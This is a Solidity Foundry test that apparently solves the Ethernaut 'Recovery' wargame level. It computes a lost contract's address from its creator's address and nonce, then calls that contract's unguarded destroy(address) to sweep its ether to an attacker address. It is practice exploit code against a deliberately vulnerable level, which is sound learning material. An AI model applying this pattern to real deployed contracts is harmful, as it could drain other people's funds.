// SPDX-License-Identifier: MIT
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "../src/Recovery/Recovery.sol";
import "../src/Recovery/RecoveryFactory.sol";
import "../src/Ethernaut.sol";

contract RecoveryTest is Test {
    Ethernaut private _ethernaut;
    RecoveryFactory private _recoveryFactory;
    Recovery private _recovery;

    address private _hacker = address(0xA);

    modifier testWrapper() {
        vm.deal(_hacker, 1 ether);
        _ethernaut.registerLevel(_recoveryFactory);
        vm.startPrank(_hacker);
        address instance = _ethernaut.createLevelInstance{value: 0.001 ether}(
            _recoveryFactory
        );
        _recovery = Recovery(instance);
        _;
        bool success = _ethernaut.submitLevelInstance(
            payable(address(_recovery))
        );
        assertTrue(success);
        vm.stopPrank();
    }

    function setUp() public {
        _ethernaut = new Ethernaut();
        _recoveryFactory = new RecoveryFactory();
    }

    function testRecoveryHack() public testWrapper {
        address target = address(
            uint160(
                uint256(
                    keccak256(
                        abi.encodePacked(
                            uint8(0xd6),
                            uint8(0x94),
                            address(_recovery),
                            uint8(0x01)
                        )
                    )
                )
            )
        );
        console2.log(address(_recovery));
        console2.log(target);
        (bool success, ) = target.call(
            abi.encodeWithSignature("destroy(address)", _hacker)
        );
        assertTrue(success);
    }
}
